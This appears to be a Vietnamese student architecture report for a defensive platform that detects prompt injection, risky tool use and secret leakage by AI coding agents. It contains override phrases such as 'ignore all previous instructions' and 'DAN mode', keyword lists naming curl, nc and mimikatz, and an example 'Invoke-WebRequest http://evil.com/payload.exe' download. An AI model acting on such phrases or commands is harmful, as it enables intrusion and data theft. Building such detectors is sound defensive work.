# BÁO CÁO KIẾN TRÚC KỸ THUẬT
## AI RUNTIME THREAT DETECTION & RESPONSE PLATFORM

**Tác giả:** ThanhLN9  
**Phiên bản:** 2.0 — Tháng 6/2026  
**Chương trình:** Đào tạo sinh viên thực tập – Dev Core Agent EDR

---

## Mục Tiêu Đề Tài

Phát hiện, ngăn chặn và điều tra các hành vi nguy hiểm phát sinh từ môi trường lập trình có sự hỗ trợ của trí tuệ nhân tạo (AI-assisted development như VS Code, Cursor, AI Agent) thông qua các mục tiêu cốt lõi:

- Thu thập dữ liệu hành vi ứng dụng AI (AI Runtime Telemetry Collection).
- Giám sát sự kiện cấp hệ điều hành thời gian thực (System Telemetry Collection).
- Liên kết chuỗi sự kiện đa tầng bằng thuật toán tương quan (Event Correlation).
- Đánh giá rủi ro và cấu hình phản ứng linh hoạt (Risk Scoring & Automated Containment).
- Trực quan hóa chuỗi tấn công phục vụ điều tra SOC (Incident Graph Visualization & Root Cause Analysis).

---

## Điểm Đổi Mới Cốt Lõi (Core Innovation)

Khác với các giải pháp EDR truyền thống chỉ quan sát các hành động xảy ra trên hệ điều hành (**Action Space**), nền tảng đề xuất bổ sung thêm lớp **AI Runtime Telemetry** để quan sát **ý định** (Intent Space) phát sinh từ AI Agent.

Hệ thống thực hiện **Intent–Action Correlation** bằng cách liên kết dữ liệu từ AI Runtime Telemetry với System Telemetry nhằm phát hiện sớm các chuỗi tấn công được kích hoạt bởi AI Agent.

```
AI Runtime Telemetry  +  System Telemetry
              ↓
     Intent–Action Correlation
              ↓
        Threat Detection
              ↓
     Risk-based Response
```

---

## 1. KIẾN TRÚC TỔNG THỂ HỆ THỐNG

Hệ thống được thiết kế theo kiến trúc hướng sự kiện bất đồng bộ (**Asynchronous Event-Driven Architecture**) với hai luồng xử lý song song. Toàn bộ cấu hình được quản lý tập trung qua `config.yaml`, tránh hardcode rải rác.

```
┌─────────────────────────────────────────┐
│       AI-assisted Environment           │
│  (VS Code / Cursor / GitHub Copilot)    │
└──────────────┬──────────────────────────┘
               │ SDK Client (IPC)
               ▼
┌─────────────────────────────────────────┐
│       AI Runtime Telemetry Layer        │
│  ┌───────────────┐  ┌────────────────┐  │
│  │ IPC Server    │  │  Agent Logger  │  │
│  │ Named Pipe /  │  │  (Simulator)   │  │
│  │ TCP Socket    │  │                │  │
│  └──────┬────────┘  └────────┬───────┘  │
│         │                    │          │
│  ┌──────▼────────────────────▼───────┐  │
│  │         Event Normalizer          │  │
│  └──────────────┬────────────────────┘  │
│                 │                       │
│  ┌──────────────▼────────────────────┐  │
│  │  PromptMonitor  │  ToolMonitor    │  │
│  │  ResponseMonitor (3 Monitors)     │  │
│  └──────────────┬────────────────────┘  │
└─────────────────┼───────────────────────┘
                  │ ai_event_queue
                  ▼
┌─────────────────────────────────────────┐
│      Sysmon Telemetry Collector         │
│  Event ID 1  │  ID 3  │  ID 11         │
│  ID 13 (Registry)  │  ID 22 (DNS)      │
└───────────────────┬─────────────────────┘
                    │ sysmon_event_queue
                    ▼
┌─────────────────────────────────────────┐
│          Correlation Engine             │
│  Intent–Action Correlation             │
│  Sliding Window (30s)  |  Δt ≤ 2s     │
│  AI Anomaly Auto-Incident              │
│  Session Tracking + ParentImage Filter │
└───────────────────┬─────────────────────┘
                    │ incident_queue
                    ▼
┌─────────────────────────────────────────┐
│          Detection Engine               │
│  Rule-based + Heuristic Detection      │
│  Allowlist Filter (False Positive)     │
└───────────────────┬─────────────────────┘
                    │
                    ▼
┌─────────────────────────────────────────┐
│         Risk Scoring Engine             │
│  Rule + Process + Network + Corr.      │
│  + Monitor Bonus (Prompt/Tool/Resp.)   │
└───────────────────┬─────────────────────┘
                    │ action_dispatcher (fan-out)
                    ▼
┌─────────────────────────────────────────┐
│          Response Engine                │
│  Alert Generation  │  Kill Process     │
│  alert_queue/ JSON │  Containment      │
└────────┬──────────────────┬────────────┘
         │ (async)          │ (async)
         ▼                  ▼
┌──────────────┐  ┌────────────────────────┐
│ AI Security  │  │   Neo4j Incident Graph │
│ Analyzer     │  │   + logs/dashboard.jsonl│
│ (DeBERTa NLP)│  │   (Ghi log giao diện)  │
│ (8 labels)   │  └────────┬───────────────┘
│              │           │ Đọc file log
└──────────────┘  ┌────────▼───────────────┐
                  │ Web Dashboard Độc Lập  │
                  │ http://localhost:8888  │
                  └────────────────────────┘
```

### Luồng xử lý thời gian thực (Realtime Path)
```
IPC Server / Sysmon → Correlation Engine → Detection Engine → Risk Scoring → Response Engine
```

### Luồng xử lý bất đồng bộ (Async Path)
```
Response Engine → action_dispatcher (fan-out 1:3)
                  ├→ Containment Engine (Kill Process)
                  ├→ Neo4j / Log Dashboard
                  └→ AI Security Analyzer (NLP)
```

Thiết kế này đảm bảo mô hình NLP không nằm trên đường thời gian thực, duy trì khả năng phát hiện và phản ứng near-realtime. `action_dispatcher` sử dụng fan-out pattern để clone incident tới 3 consumer queue độc lập, giải quyết giới hạn single-consumer của `queue.Queue`.

---

## 2. QUẢN LÝ CẤU HÌNH TẬP TRUNG

Toàn bộ thông số hệ thống (thresholds, credentials, whitelist, model name, ports) được quản lý trong **một file duy nhất** `config.yaml`. Không có giá trị nào được hardcode trong source code.

### 2.1. Config Loader

Module `config_loader.py` cung cấp API đơn giản cho toàn bộ project:

```python
import config_loader

# Truy cập theo section + key + default
uri = config_loader.get("neo4j", "uri", "bolt://localhost:7687")
delta_t = config_loader.get("correlation", "delta_t_threshold", 2.0)
whitelist = config_loader.get("whitelist_parent_images", default=[])

# Trả về toàn bộ section
corr_cfg = config_loader.get("correlation", default={})
```

Config được cache trong bộ nhớ sau lần đọc đầu tiên (`_config_cache`), đảm bảo YAML chỉ parse 1 lần trong suốt vòng đời ứng dụng.

### 2.2. Cấu Trúc Config

| Section | Nội dung | Ví dụ |
|---|---|---|
| `neo4j` | URI, user, password | `bolt://localhost:7687` |
| `ports` | Dashboard, IPC, Attack Server | `8888`, `9999`, `8080` |
| `correlation` | Window, delta_t, keywords | `30s`, `2.0s`, `["curl", "wget", ...]` |
| `detection` | Threshold, keywords, allowlist | `60`, `["github.com", ...]` |
| `containment` | Mode, whitelist processes | `CONTAIN` / `ALERT` |
| `whitelist_parent_images` | IDE processes (chống False Positive) | `["antigravity", "code.exe", ...]` |
| `nlp` | Model name, labels, HF mirror | `cross-encoder/nli-deberta-v3-small` |
| `risk_weights` | Trọng số cho Risk Scoring | `rule: 20, process: 20, ...` |
| `tool_monitor` | Excessive/Mass enum limits | `10 calls/30s`, `5 files/10s` |

---

## 3. AI RUNTIME TELEMETRY LAYER

### 3.1. IPC Channel (Kênh Giao Tiếp Nội Bộ)

Thành phần cốt lõi nhận telemetry từ AI Agent qua hai cơ chế:

| Cơ chế | Địa chỉ | Ưu tiên |
|---|---|:---:|
| Windows Named Pipe | `\\.\pipe\ai_edr_telemetry` | 1 (ưu tiên) |
| TCP Socket | `127.0.0.1:9999` | 2 (fallback) |

Nguyên tắc **Decoupled AI Integration**: Mọi AI Agent chỉ cần gửi JSON event qua IPC Channel. Không phụ thuộc vào một AI Agent cụ thể — có thể mở rộng sang Cursor, GitHub Copilot, Claude Code, OpenAI Agents hoặc AI Agent nội bộ mà không thay đổi kiến trúc lõi.

### 3.2. SDK Client

SDK nhẹ dành cho AI Agent tích hợp telemetry:

```python
from ai_telemetry.sdk_client import AITelemetryClient

client = AITelemetryClient(agent_name="Cursor")
client.connect()
client.log_prompt("Write a sort function")          # Ghi nhận prompt
client.log_tool_invocation("file_read", ".env")     # Ghi nhận tool call
client.log_response("aws_key = AKIA...")            # Ghi nhận response
client.log_agent_action("terminal.execute", ...)    # Ghi nhận hành động
```

### 3.3. Cấu Trúc AI Event

```json
{
  "ai_event_id": "PROMPT-1750123456789",
  "event_type": "prompt",
  "agent": "Cursor",
  "action": "prompt.received",
  "content": "[SYSTEM OVERRIDE] Ignore all previous instructions...",
  "session_id": "sess-abc-123",
  "prompt_type": "user",
  "timestamp": "2026-06-23T09:00:00.000Z"
}
```

Bốn loại event được hỗ trợ: `prompt` · `response` · `tool_invocation` · `agent_action`

---

## 4. BỘ GIÁM SÁT AI (AI TELEMETRY MONITORS)

Ba monitor phân tích event AI theo thời gian thực, hoạt động trong luồng IPC Server:

### 4.1. Prompt Monitor — Phát Hiện Prompt Injection

9 regex pattern phát hiện 7 nhóm tấn công qua prompt, mỗi pattern có **trọng số riêng** (weighted scoring):

| Nhóm | Pattern mẫu | Trọng số |
|---|---|:---:|
| Instruction Override | `ignore all previous instructions` | 30 |
| Role Hijack | `you are now in DAN mode` | 25 |
| Jailbreak | `developer mode enabled`, `do anything now` | 25 |
| Prompt Leak | `reveal your system prompt` | 20 |
| System Override | `[SYSTEM OVERRIDE]`, `[ADMIN MODE]` | 30 |
| Command Execution | `execute the following command` | 25 |
| Data Exfiltration | `send all data to http://... via POST` | 30 |

Đầu ra: `injection_score` (0–100), `risk_level` (NONE/LOW/MEDIUM/HIGH/CRITICAL), `matched_patterns`.

**Tính toán điểm:**
- Score = Σ trọng số các pattern matched (capped at 100)
- `CRITICAL` nếu score ≥ 60, `HIGH` nếu ≥ 40, `MEDIUM` nếu ≥ 20

### 4.2. Tool Monitor — Phát Hiện Hành Vi Tool Bất Thường

| Loại phát hiện | Ngưỡng (configurable) |
|---|---|
| Excessive Tool Usage | > 10 calls / 30 giây |
| Sensitive File Access | `.env`, `id_rsa`, `credentials`, `.pem`, `kubeconfig`... |
| Mass File Enumeration | > 5 file khác nhau / 10 giây |
| Suspicious Terminal | `curl`, `wget`, `iex`, `nc`, `mimikatz`, `schtasks`... |

Sử dụng **Sliding Window** với `threading.Lock()` để thread-safe. Tất cả ngưỡng đọc từ `config.yaml` section `tool_monitor`.

### 4.3. Response Monitor — Phát Hiện Rò Rỉ Dữ Liệu

12 regex pattern phát hiện sensitive data trong AI response:

| Loại | Regex Pattern | Severity |
|---|---|:---:|
| AWS Access Key | `AKIA[A-Z0-9]{16}` | CRITICAL |
| AWS Secret Key | `(?:aws_secret_access_key\|SecretAccessKey)` | CRITICAL |
| GCP API Key | `AIza[A-Za-z0-9_-]{35}` | CRITICAL |
| Private Key | `-----BEGIN (RSA\|EC\|DSA\|OPENSSH) PRIVATE KEY-----` | CRITICAL |
| JWT Token | `eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+` | HIGH |
| GitHub Token | `ghp_[A-Za-z0-9]{36}` | CRITICAL |
| Bearer Token | `Bearer\s+[A-Za-z0-9_\-\.]{20,}` | HIGH |
| Password | `(?:password\|passwd\|pwd)\s*[=:]\s*.+` | HIGH |
| SQL Connection | `(?:Server\|Data Source)=.+;.*(?:Password\|Pwd)=` | CRITICAL |
| MongoDB URI | `mongodb(?:\+srv)?://[^:]+:[^@]+@` | CRITICAL |
| API Key Generic | `(?:api_key\|apikey\|api-key)\s*[=:]\s*['\"]?[A-Za-z0-9_\-]{20,}` | HIGH |
| Connection String | `(?:mysql\|postgres\|redis)://[^:]+:[^@]+@` | CRITICAL |

---

## 5. SYSTEM TELEMETRY LAYER

Giám sát sự kiện hệ điều hành thời gian thực qua **Microsoft Sysmon**.

| Event ID | Mô tả | Mục đích |
|---|---|---|
| 1 | Process Creation | Phát hiện PowerShell, CMD spawn |
| 3 | Network Connection | Phát hiện C2 connection |
| 11 | File Create | Phát hiện payload write |
| 13 | Registry Modification | Phát hiện persistence |
| 22 | DNS Query | Phát hiện C2 domain resolution |

Thư viện: `pywin32` (win32evtlog.EvtSubscribe), `xmltodict`, `psutil`.

**Event Parser** hỗ trợ whitelist ngay từ đầu pipeline để giảm noise:
```yaml
sysmon:
  whitelist_images:
    - "code.exe"
    - "chrome.exe"
    - "explorer.exe"
    - "svchost.exe"
```

---

## 6. CORRELATION ENGINE

Thành phần trung tâm liên kết Intent Space (AI Telemetry) và Action Space (Sysmon).

### 6.1. Thuật Toán Correlation

- Sliding Window Buffer trong RAM (30 giây, tối đa 100 events)
- Time-delta correlation: **|Δt| ≤ 2 giây** (giá trị tuyệt đối, vì Sysmon có thể đến trước AI event)
- Matching key: Timestamp + Tool Context (`ai_tool in sys_image`)
- Tất cả tham số đọc từ `config.yaml`

### 6.2. Ba Chế Độ Tạo Incident

| Chế độ | Nguồn | Loại Incident | Trigger |
|---|---|---|---|
| **Correlated** | AI Event + Sysmon Event | `CORRELATED` | \|Δt\| ≤ 2s && tool match |
| **AI Anomaly** | Monitor phát hiện HIGH/CRITICAL | `PROMPT_INJECTION` / `TOOL_ANOMALY` / `DATA_DISCLOSURE` | Tự động, không cần Sysmon |
| **Orphan Suspicious** | Sysmon-only (PowerShell/CMD đáng ngờ) | `ORPHAN_SUSPICIOUS` | Keyword match + KHÔNG bị whitelist |

Chế độ **AI Anomaly** là điểm đổi mới so với kiến trúc EDR truyền thống: hệ thống phát hiện mối đe dọa ở tầng **Intent** trước khi chúng tác động xuống hệ điều hành.

### 6.3. Cơ Chế Chống False Positive

Vấn đề thực tế: Lệnh `git commit -m "Refactor: Replace Write-Host with Invoke-WebRequest"` chứa keyword `invoke-webrequest` trong commit message → bị detect nhầm là tấn công.

**Giải pháp 2 lớp:**

**Lớp 1 — ParentImage Whitelist:**
```yaml
whitelist_parent_images:
  - "antigravity"           # Antigravity IDE
  - "language_server_windows"
  - "code.exe"              # VS Code
  - "cursor.exe"            # Cursor
  - "idea64.exe"            # IntelliJ
  - "pycharm64.exe"         # PyCharm
  - "devenv.exe"            # Visual Studio
  - "copilot"               # GitHub Copilot
```

Nếu `ParentImage` của Sysmon event chứa bất kỳ pattern nào trong whitelist → bỏ qua, không tạo `ORPHAN_SUSPICIOUS`.

**Lớp 2 — Context-Aware Keyword Detection:**

Hàm `_is_keyword_in_string_literal(cmdline, keyword)` kiểm tra keyword có nằm **bên trong cặp dấu nháy** hay không:
- Đếm số dấu `'` và `"` trước vị trí keyword
- Nếu số dấu nháy lẻ → keyword nằm trong string literal → bỏ qua
- Nếu chẵn → keyword nằm ngoài string → IS an actual command → detect

```
✗  powershell -Command "git commit -m 'Refactor Invoke-WebRequest'"
   → "invoke-webrequest" nằm trong cặp nháy đơn lẻ → BỎ QUA

✓  powershell Invoke-WebRequest http://evil.com
   → "invoke-webrequest" nằm ngoài dấu nháy → DETECT
```

### 6.4. Session Tracking

Events cùng `session_id` được track trong `session_events` dict:
```python
self.session_events = {}  # session_id → [event1, event2, ...]
```
API `get_session_chain(session_id)` phục vụ Dashboard vẽ Attack Chain.

### 6.5. Đầu Ra

```json
{
  "incident_id": "INC-0042",
  "incident_type": "PROMPT_INJECTION",
  "severity": "CRITICAL",
  "session_id": "sess-abc-123",
  "ai_event": { "agent": "Cursor", "action": "prompt.received" },
  "prompt_analysis": { "injection_score": 85, "risk_level": "CRITICAL",
                       "matched_patterns": ["instruction_override", "system_override"] }
}
```

---

## 7. DETECTION ENGINE

Rule-based & Heuristic Detection, đảm bảo tốc độ xử lý thời gian thực.

| Kịch bản | Dấu hiệu phát hiện |
|---|---|
| Prompt Injection | `ignore previous instructions`, `jailbreak`, `DAN mode`, `system override` |
| Sensitive File Access | `.env`, `id_rsa`, `credentials.txt`, `password`, `secret.key` |
| Suspicious Tool Usage | `powershell.exe`, `cmd.exe`, `curl.exe`, `wget.exe` |
| Executable Download | `curl *.exe`, `Invoke-WebRequest *.exe`, `wget *.exe` |
| AI-driven Attack Chain | `Cursor.exe → PowerShell.exe → curl.exe → Network` |

**Allowlist** (chống false positive, configurable):
```yaml
allowed_domains:
  - "github.com"
  - "viettel.com.vn"
  - "localhost"
  - "127.0.0.1"
  - "pypi.org"
  - "microsoft.com"
  - "google.com"
```

---

## 8. RISK SCORING ENGINE

### 8.1. Thuật Toán Risk Scoring (Nâng cấp — 5 biến số)

```
Total Risk Score = Rule Severity + Process Weight + Network Activity
                 + Correlation Confidence + Monitor Bonus
```

| Thành phần | Điểm tối đa | Điều kiện |
|---|:---:|---|
| Rule Severity | 20 | Keyword nguy hiểm trong CommandLine |
| Process Weight | 20 | PowerShell (+20), CMD (+10) |
| Network Activity | 20 | HTTP/FTP/curl/wget trong lệnh |
| Correlation Confidence | 30 | Có AI Agent xác nhận tương quan |
| **Monitor Bonus** | **35** | **Tích hợp từ 3 Monitors (mới)** |

**Chi tiết Monitor Bonus:**

| Monitor | Bonus | Điều kiện |
|---|:---:|---|
| PromptMonitor | +15 | `injection_score` ≥ 40 |
| ToolMonitor | +10 | `risk_score` ≥ 30 |
| ResponseMonitor | +10 | `disclosure_score` ≥ 30 |

Tổng điểm tối đa lý thuyết: **125/100** (capped bởi severity mapping).

| Score | Severity |
|:---:|---|
| 0–29 | LOW |
| 30–59 | MEDIUM |
| ≥ 60 | CRITICAL |

**Ví dụ thực tế:**

```
Prompt Injection qua IPC (PromptMonitor score=80):
  Rule(20) + PowerShell(20) + Network(20) + Correlation(30) + Prompt_Bonus(15) = 105 → CRITICAL

Git push bình thường (ParentImage = Antigravity IDE):
  → Bị whitelist chặn trước khi vào Risk Scoring → KHÔNG tạo incident
```

Tất cả trọng số đọc từ `config.yaml` section `risk_weights`, có thể điều chỉnh mà không sửa code.

---

## 9. RESPONSE ENGINE & CONTAINMENT POLICY

### 9.1. Containment Mode (configurable)

```yaml
containment:
  mode: "CONTAIN"    # "CONTAIN" = tự động kill | "ALERT" = chỉ cảnh báo
```

| Mode | Hành vi |
|---|---|
| `CONTAIN` | Tự động `psutil.Process(pid).terminate()` + ghi Alert JSON |
| `ALERT` | Chỉ ghi Alert JSON vào `alert_queue/`, KHÔNG kill process |

### 9.2. Whitelist (Fail-Safe)

```yaml
containment:
  whitelist_processes:
    - "code.exe"        # VS Code
    - "cursor.exe"      # Cursor
    - "explorer.exe"    # Windows Explorer
    - "svchost.exe"     # Windows Service Host
    - "python.exe"      # Python interpreter
    - "lsass.exe"       # Local Security Authority
    ...
```

Whitelist được merge với `whitelist_parent_images` để đảm bảo IDE processes **không bao giờ** bị terminate, kể cả khi Rules/ML nhận diện nhầm.

### 9.3. Thread Safety

`ContainmentEngine` sử dụng `threading.Lock()` (action_lock) để đảm bảo:
- Không có race condition giữa các lệnh kill đồng thời
- Thread không bị deadlock nếu `psutil` crash giữa chừng (dùng `try...finally`)

---

## 10. AI SECURITY ANALYZER (NLP)

Chạy hoàn toàn bất đồng bộ trên Worker Thread riêng.

### 10.1. Model

**Model:** `cross-encoder/nli-deberta-v3-small` (lightweight, ~150MB, phù hợp Endpoint)

Tải qua HuggingFace Mirror châu Á (`hf-mirror.com`) để tối ưu tốc độ kết nối:
```yaml
nlp:
  model_name: "cross-encoder/nli-deberta-v3-small"
  hf_mirror: "https://hf-mirror.com"
```

### 10.2. Multi-Source Analysis (Nâng cấp)

NLP phân tích **3 nguồn text** cho mỗi incident, chọn classification có confidence cao nhất:

| Nguồn | Ví dụ |
|---|---|
| Sysmon CommandLine | `powershell -Command "Invoke-WebRequest http://evil.com/payload.exe"` |
| AI Prompt Content | `[SYSTEM OVERRIDE] Ignore all previous instructions...` |
| AI Action Description | `terminal.execute using powershell` |

> **Lưu ý Kiến trúc (Bảo vệ trước Hội đồng):**
> Mô hình NLP Zero-shot DeBERTa **KHÔNG** được sử dụng làm yếu tố quyết định để tiêu diệt tiến trình (Containment). Confidence score từ NLP không có tính so sánh định lượng tuyệt đối giữa các văn bản khác nhau.
> Vai trò thực sự của NLP là **Enrichment & Explainability**: Hoạt động bất đồng bộ ở vòng ngoài, giúp gán nhãn (ví dụ: "Data Exfiltration") để SOC Analyst dễ dàng đọc hiểu báo cáo sự cố. Quyết định ngăn chặn được EDR thực thi dựa hoàn toàn vào Deterministic Rules và Heuristic Risk Score ở tốc độ millisecond.

### 10.3. Expanded Candidate Labels (8 labels)

```yaml
candidate_labels:
  - "remote code execution"
  - "data exfiltration"
  - "prompt injection"          # Mới
  - "credential access"         # Mới
  - "privilege escalation"      # Mới
  - "system discovery"
  - "lateral movement"          # Mới
  - "benign task"
```

### 10.4. Incident Summary Report

Mỗi incident được sinh báo cáo JSON đầy đủ trong `reports/`:

```json
{
  "report_id": "RPT-INC-0042",
  "generated_at": "2026-06-23T15:30:00.000+00:00",
  "incident_id": "INC-0042",
  "severity": "CRITICAL",
  "intent_space": { "ai_agent": "Cursor", "action": "prompt.received", "session_id": "sess-abc" },
  "action_space": { "process": "powershell.exe", "cmdline": "...", "parent": "cursor.exe" },
  "analysis": {
    "matched_rules": ["Suspicious Keyword: invoke-webrequest", "Process: PowerShell"],
    "nlp_threat_label": "remote code execution",
    "attack_type": "Executable Download / C2 Callback"
  },
  "monitor_analysis": {
    "prompt_injection": { "is_injection": true, "injection_score": 85 },
    "tool_anomaly": {},
    "data_disclosure": {}
  },
  "response": { "action_taken": "KILL_PROCESS", "status": "CONTAINED" }
}
```

---

## 11. INCIDENT GRAPH & WEB DASHBOARD

### 11.1. Neo4j Schema (7 Node Types)

```
(AIAgent) -[:TRIGGERED]→ (Incident) -[:EXECUTED]→    (Process)
               |                   |
      -[:OCCURRED_ON]→    -[:NETWORK_ACTIVITY]→   (NetworkConn)
           (Endpoint)     -[:MODIFIED_REGISTRY]→  (RegistryKey)
               |
      -[:CONTAINS_PROMPT]→ (PromptEvent)
```

Chỉ Incident có Risk Score ≥ CRITICAL mới được đẩy lên Neo4j. Nếu Neo4j offline, hệ thống tự động fallback xuất file `.cypher` phục vụ import thủ công.

### 11.2. Web Dashboard Độc Lập (web_dashboard.py)

Dashboard được thiết kế như một Microservice độc lập. Nó liên tục đọc file `logs/dashboard_feed.jsonl` do EDR xuất ra để cung cấp giao diện giám sát thời gian thực với **3 tabs**:

#### Tab 1 — Incident Graph (SVG)
- Vẽ đồ thị nodes + edges thể hiện chiều sâu của cuộc tấn công: `Agent -> Incident -> Process -> Network/Registry`.
- 9 node types với màu sắc riêng: Incident (đỏ), AIAgent (xanh dương), Process (xanh lá), Endpoint (vàng), PromptEvent (tím), ToolAnomaly (cam), DataLeak (vàng đậm), NetworkConn (cam đậm), RegistryKey (vàng).
- Hiển thị mối quan hệ: TRIGGERED, ON, EXECUTED, PROMPT, TOOL, LEAK, CONN, MODIFIED.

#### Tab 2 — Timeline (Mới)
- Hiển thị tất cả incidents cùng `session_id` trên trục thời gian
- Severity dots có màu và glow effect tương ứng (CRITICAL = đỏ + shadow, HIGH = vàng, ...)
- Hiển thị timestamp chính xác đến millisecond
- Preview CommandLine cho mỗi event

#### Tab 3 — Attack Chain (Reconstruction)
- Không chỉ liệt kê Incident, hệ thống tự động **"bung" (unpack)** chuỗi sự kiện trong cùng một `session_id` thành các Step nối tiếp nhau:
  `Prompt Injection` ↓ `Tool Invocation` ↓ `Process Execution` ↓ `Network Activity` ↓ `Data Disclosure`
- Thể hiện chân thực chuỗi Attack Chain như trên các hệ thống SOC chuyên nghiệp.

#### Thành phần chung
- **Stat Cards**: Tổng Incident / Critical / High / Prompt Injection / Tool Anomaly / Data Disclosure
- **Filter Bar**: Lọc theo loại incident (PROMPT_INJECTION / TOOL_ANOMALY / DATA_DISCLOSURE / CORRELATED / ORPHAN_SUSPICIOUS)
- **Detail Panel**:
  - Tự động gán và hiển thị nhãn **MITRE ATT&CK Tactics** (T1059, T1041, T1071...).
  - Render **Process Tree** đồ họa (ParentProcess └── ChildProcess └── Network).
- **Session ID**: Hiển thị trên mỗi incident item trong danh sách
- **Auto-refresh**: Polling `/api/incidents` mỗi 2 giây

---

## 12. LOGGING FRAMEWORK

Hệ thống sử dụng Python `logging` module thay thế `print()` rời rạc, cấu hình tập trung trong `main.py`:

| Handler | Level | Đầu ra 
|---|---|---|
| Console (`StreamHandler`) | INFO+ | Terminal (stdout) |
| File (`FileHandler`) | DEBUG+ | `edr_engine.log` (UTF-8) |

Mỗi module sử dụng logger riêng với namespace phân cấp:

```
EDR.Main          # main.py
EDR.Correlation   # correlation_engine.py
EDR.Detection     # rule_engine.py
EDR.RiskScoring   # risk_scoring.py
EDR.Containment   # containment.py
EDR.NLP           # nlp_classifier.py
EDR.Summary       # incident_summary.py
EDR.Neo4j         # graph_builder.py
EDR.Sysmon        # sysmon_listener.py
EDR.IPC           # ipc_server.py
EDR.Dashboard     # dashboard.py
EDR.Config        # config_loader.py
```

Ưu điểm:
- Dễ dàng lọc log theo module (`grep "EDR.Correlation" edr_engine.log`)
- File log phục vụ post-incident forensics
- Có thể thay đổi log level per-module mà không restart hệ thống

---

## 13. UNIT TESTING

Hệ thống bao gồm **41 unit tests** sử dụng framework `unittest` tích hợp sẵn trong Python:

```
tests/
├── test_prompt_monitor.py    # 11 tests — 9 injection patterns + 2 negative cases
├── test_response_monitor.py  # 10 tests — 8 secret types + 2 negative cases
├── test_tool_monitor.py      #  7 tests — sensitive file, terminal, mass enum, negatives
├── test_risk_scoring.py      #  5 tests — CRITICAL, LOW, 3 monitor bonuses
└── test_correlation.py       #  9 tests — ParentImage whitelist, context-aware keyword,
                              #            false positive reproduction, session tracking
```

### Test Coverage

| Module | Tests | Coverage |
|---|:---:|---|
| PromptMonitor | 11 | 9/9 injection patterns + normal prompts |
| ResponseMonitor | 10 | AWS, GitHub, JWT, SSH Key, Password, MongoDB, multi-secret |
| ToolMonitor | 7 | Sensitive file (3 types), terminal, mass enum, normal ops |
| RiskScoringEngine | 5 | CRITICAL detection, LOW detection, 3 monitor bonus integrations |
| CorrelationEngine | 9 | Whitelist (4 IDEs), keyword context (3), session tracking |

### Test đặc biệt: Tái tạo False Positive INC-0022

```python
def test_false_positive_git_push_scenario(self):
    """Tái tạo chính xác false positive INC-0022:
    git commit message chứa 'Invoke-WebRequest' nhưng KHÔNG phải lệnh thực tế.
    ParentImage là Antigravity IDE → phải bị whitelist chặn."""
    parent = "C:\\...\\Antigravity IDE\\...\\language_server_windows_x64.exe"
    self.assertTrue(self.engine._is_parent_whitelisted(parent))
```

### Chạy Tests

```bash
python -m unittest discover -s tests -v
# Ran 41 tests in 0.027s — OK ✓
```

---

## 14. DEMO SCENARIO & SIMULATION FRAMEWORK

### Scenario 1–5: Sysmon-level Detection
Mô phỏng qua `subprocess` + PowerShell, trigger Sysmon Events.

| # | Kịch bản | Dấu hiệu EDR |
|:---:|---|---|
| 1 | Prompt Injection → PowerShell spawn | `Suspicious Keyword: payload` + `Process: PowerShell` |
| 2 | Sensitive File Access + Data Exfiltration | `Sensitive File Access` + `Network: Outbound` |
| 3 | Suspicious Tool Usage (C2 beacon) | `Process: PowerShell` + `Process: CMD` |
| 4 | Executable Download via Network | `Suspicious Keyword: curl` + `Network` → CRITICAL |
| 5 | Full AI-Driven Attack Chain | Risk Score 90+ → CRITICAL → Kill + Alert + Neo4j |

### Scenario 6–8: AI Telemetry IPC Detection
Mô phỏng qua **SDK Client** — gửi event thật qua IPC, trigger 3 Monitors.

| # | Kịch bản | Monitor | Events gửi |
|:---:|---|---|---|
| 6 | Prompt Injection qua IPC | PromptMonitor | 4 prompts (1 bình thường + 3 injection) |
| 7 | Sensitive File + Mass Enumeration | ToolMonitor | 1 normal + 3 sensitive + 8 mass enum + 1 terminal |
| 8 | Data Disclosure trong AI Response | ResponseMonitor | 1 normal + 4 rò rỉ (AWS, SSH, DB, JWT) |

### Luồng Demo Tổng Hợp (Scenario 5 + 6)

```
Prompt Injection (SDK Client → IPC Server)
    ↓ PromptMonitor → injection_score=85 → CRITICAL
    ↓ Auto-Incident (không cần đợi Sysmon)
    ↓ Risk Score += prompt_bonus(15)
    ↓
PowerShell Spawn (Sysmon ID 1)
    ↓ Correlated Incident (|Δt| ≤ 2s)
    ↓ Risk Score: Rule(20) + PS(20) + Net(20) + Corr(30) + Bonus(15) = 105
    ↓ CRITICAL → Kill Process + Alert JSON
    ↓
Response Engine → action_dispatcher (fan-out 1:3)
    ├→ Containment Engine → psutil.terminate(pid)
    ├→ Neo4j Graph → Cypher → Incident nodes + edges
    └→ NLP Analyzer → DeBERTa → "remote code execution" (93.2%)
                     → Incident Summary → reports/RPT-INC-0042.json

Dashboard (http://localhost:8888)
    → Tab 1: Incident Graph (nodes: Agent → Incident → Process → Network)
    → Tab 2: Timeline (session events trên trục thời gian)
    → Tab 3: Attack Chain (step-by-step: Injection → PowerShell → Download)
```

---

## 15. CẤU TRÚC SOURCE CODE

```
AI_Runtime_Security/
├── main.py                          # EDR Engine Main Entrypoint
├── web_dashboard.py                 # Standalone Web Dashboard Server
├── config.yaml                      # Cấu hình tập trung toàn hệ thống
├── config_loader.py                 # Đọc và map config
│
├── ai_telemetry/
│   ├── ipc_server.py                # IPC Server (Named Pipe + TCP fallback)
│   ├── sdk_client.py                # SDK cho AI Agent gửi telemetry
│   ├── prompt_monitor.py            # Phát hiện Prompt Injection (9 patterns, weighted)
│   ├── tool_monitor.py              # Phát hiện Tool Anomaly (sliding window)
│   ├── response_monitor.py          # Phát hiện Data Disclosure (12 patterns)
│   ├── agent_logger.py              # Simulator + trigger methods (demo)
│   └── event_normalizer.py          # Chuẩn hoá event schema
│
├── collector/
│   ├── sysmon_listener.py           # Win32 Event Subscribe (EvtSubscribe)
│   └── event_parser.py              # Parse XML → Dict (ID 1,3,11,13,22)
│
├── correlation/
│   └── correlation_engine.py        # Intent–Action Correlation + Auto-Incident
│                                    # + ParentImage Whitelist + Session Tracking
│
├── detector/
│   ├── rule_engine.py               # Rule-based + Allowlist (reads config)
│   ├── risk_scoring.py              # Risk Score Engine (5 biến số + monitor bonus)
│   └── containment.py               # Kill Process + Fail-Safe Whitelist
│
├── analyzer/
│   ├── nlp_classifier.py            # DeBERTa Zero-Shot NLP (3 sources, 8 labels)
│   └── incident_summary.py          # Sinh báo cáo incident (reports/)
│
├── graph/
│   ├── neo4j_loader.py              # Cypher Query Builder (7 node types)
│   ├── graph_builder.py             # Neo4j Writer + JSONL Dashboard Feed
